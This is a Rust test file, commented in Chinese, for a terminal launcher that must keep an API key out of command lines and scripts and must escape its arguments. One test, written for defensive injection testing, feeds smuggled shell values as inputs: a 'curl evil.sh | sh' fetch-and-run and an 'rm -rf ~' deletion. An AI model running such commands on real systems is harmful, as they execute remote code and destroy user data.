//! Task 6：终端启动器测试——凭据零泄露契约。

use mini_oc_app::term_spawn::{build_terminal_plan, cleanup_env_files};

const KEY: &str = "supersecretkey1234567890ABCDEF";

#[cfg(unix)]
fn plan(session: Option<&str>) -> (mini_oc_app::term_spawn::TerminalPlan, tempfile::TempDir) {
    let dir = tempfile::tempdir().unwrap();
    let p = build_terminal_plan(
        "opencode",
        "http://127.0.0.1:9464",
        "/Users/x/proj",
        session,
        Some(dir.path()),
        KEY,
    )
    .unwrap();
    (p, dir)
}

#[test]
#[cfg(unix)]
fn display_command_never_contains_key() {
    let (p, _d) = plan(Some("ses_abc"));
    assert!(!p.display_command.contains(KEY), "命令行不得含 key: {}", p.display_command);
    assert!(!p.display_command.contains("supersecret"), "部分 key 也不行");
    // 命令含目录与会话参数（v2 形态）
    assert!(p.files.iter().any(|f| f.content.contains("--server")));
}

#[test]
#[cfg(unix)]
fn launcher_script_sources_env_file_without_key() {
    let (p, _dir) = plan(Some("ses_abc"));
    // launcher 脚本（.sh）内容不得含 key；env 文件是唯一明文点（0600 保护）
    for f in &p.files {
        if f.path.extension().map(|e| e == "sh").unwrap_or(false) {
            assert!(!f.content.contains(KEY), "脚本不得含 key: {}", f.content);
        }
    }
    // env 文件存在且含 export（0600 由实现负责）
    let env_files: Vec<_> = p.files.iter().filter(|f| f.path.extension().map(|e| e == "env").unwrap_or(false)).collect();
    assert_eq!(env_files.len(), 1, "恰好一个 env 文件");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&env_files[0].path).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600, "env 文件权限 0600");
    }
    // 脚本引用 env 文件
    let script = p.files.iter().find(|f| f.path.extension().map(|e| e == "sh").unwrap_or(false)).unwrap();
    let content = std::fs::read_to_string(&script.path).unwrap();
    assert!(content.contains("source") || content.contains("."), "脚本须 source env 文件");
}

#[test]
#[cfg(unix)]
fn session_argument_forms() {
    let (with_s, _d1) = plan(Some("ses_abc"));
    let script = with_s.files.iter().find(|f| f.path.extension().map(|e| e == "sh").unwrap_or(false)).unwrap();
    let content = std::fs::read_to_string(&script.path).unwrap();
    assert!(content.contains("--session 'ses_abc'"), "带会话参数: {content}");

    let (no_s, _d2) = plan(None);
    let script2 = no_s.files.iter().find(|f| f.path.extension().map(|e| e == "sh").unwrap_or(false)).unwrap();
    let content2 = std::fs::read_to_string(&script2.path).unwrap();
    assert!(!content2.contains("--session"), "无会话不带参数: {content2}");
    assert!(content2.contains("/Users/x/proj"), "目录参数存在");
}

#[test]
#[cfg(unix)]
fn cleanup_removes_stale_env_files() {
    let dir = tempfile::tempdir().unwrap();
    // 伪造一个过期 env 文件（修改时间 1 小时前）
    let stale = dir.path().join("oc-term-abc.env");
    std::fs::write(&stale, "export OPENCODE_PASSWORD=x\n").unwrap();
    let past = std::time::SystemTime::now() - std::time::Duration::from_secs(3600);
    let ft = filetime::FileTime::from_system_time(past);
    filetime::set_file_times(&stale, ft, ft).unwrap();
    // 新鲜 env 文件（不被清理）
    let fresh = dir.path().join("oc-term-new.env");
    std::fs::write(&fresh, "export OPENCODE_PASSWORD=y\n").unwrap();

    cleanup_env_files(dir.path()).unwrap();
    assert!(!stale.exists(), "过期 env 文件被清理");
    assert!(fresh.exists(), "新鲜 env 文件保留");
}

#[test]
#[cfg(unix)]
fn hostile_directory_and_session_are_escaped() {
    // I6 修复：目录/会话参数含单引号时必须转义（命令注入防护）
    let evil_dir = "/tmp/x'; curl evil.sh | sh; '";
    let evil_session = "ses'; rm -rf ~; '";
    let dir = tempfile::tempdir().unwrap();
    let plan = build_terminal_plan(
        "opencode",
        "http://127.0.0.1:9464",
        evil_dir,
        Some(evil_session),
        Some(dir.path()),
        "KEY",
    )
    .unwrap();
    for f in &plan.files {
        if f.path.extension().map(|e| e == "sh").unwrap_or(false) {
            // 参数以字面量出现（被 '\'' 转义包裹），而非裸注入
            assert!(
                f.content.contains("'/tmp/x'\\''; curl evil.sh | sh; '\\'''"),
                "目录被正确转义: {}",
                f.content
            );
        }
    }
    // 2) 生成的脚本通过 bash 语法检查（单引号配对合法）
    let script = plan
        .files
        .iter()
        .find(|f| f.path.extension().map(|e| e == "sh").unwrap_or(false))
        .unwrap();
    let status = std::process::Command::new("/bin/bash")
        .arg("-n")
        .arg(&script.path)
        .status()
        .unwrap();
    assert!(status.success(), "bash 语法检查通过（注入未破坏脚本结构）");
}
